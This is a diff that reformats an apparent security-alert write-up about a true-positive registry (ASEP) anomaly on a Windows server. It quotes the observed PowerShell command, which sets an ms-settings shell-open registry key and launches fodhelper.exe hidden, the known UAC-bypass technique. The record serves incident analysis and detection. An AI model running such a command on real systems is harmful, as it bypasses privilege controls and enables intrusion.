@@ -1,24 +1,24 @@
-Alert: Anomaly detected in ASEP registry
+**Alert:** Anomaly detected in ASEP registry
 
-Endpoint: ec2amaz-9oh9aqq
+**Endpoint:** ec2amaz-9oh9aqq
 
-User: NT AUTHORITY\SYSTEM
+**User:** NT AUTHORITY\SYSTEM
 
-OS: WindowsServer2022
+**OS:** WindowsServer2022
 
-Verdict: True positive
+**Verdict:** True positive
+
+<img width="617" height="447" alt="image" src="https://github.com/user-attachments/assets/749b2edd-5db7-44b1-af26-f4aff0e875ba" />
+
+
 
 ## Command Line:
 
 ## Some of command are:
 
-powershell.exe -ExecutionPolicy Bypass -C "New-Item 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' -Force | Out-Null; Set-ItemProperty 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' '(Default)' \"cmd /c whoami /all > \$env:TEMP\svc_ident.dat\"; New- ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' DelegateExecute '' -Force
+powershell.exe -ExecutionPolicy Bypass -C "New-Item 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' -Force | Out-Null; Set-ItemProperty 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' '(Default)' \"cmd /c **whoami** /all > \$env:TEMP\svc_ident.dat\"; New- ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' DelegateExecute '' -Force | Out-Null; Start-Process fodhelper.exe -WindowStyle Hidden"
 
-| Out-Null; Start-Process fodhelper.exe -WindowStyle Hidden"
-
-New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force | Out-Null; Set- ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' '(Default)' "cmd /c whoami /all > \$env:TEMP\svc_ident.dat"; New-ItemProperty 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' DelegateExecute '' -Force | Out-Null; Start-Process fodhelper.exe -
-
-WindowStyle Hidden
+New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force | Out-Null; Set- ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' '(Default)' "cmd /c whoami /all > \$env:TEMP\svc_ident.dat"; New-ItemProperty 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' DelegateExecute '' -Force | Out-Null; Start-Process **fodhelper.exe** - WindowStyle Hidden
 
 
 ## Why was the alert triggered?
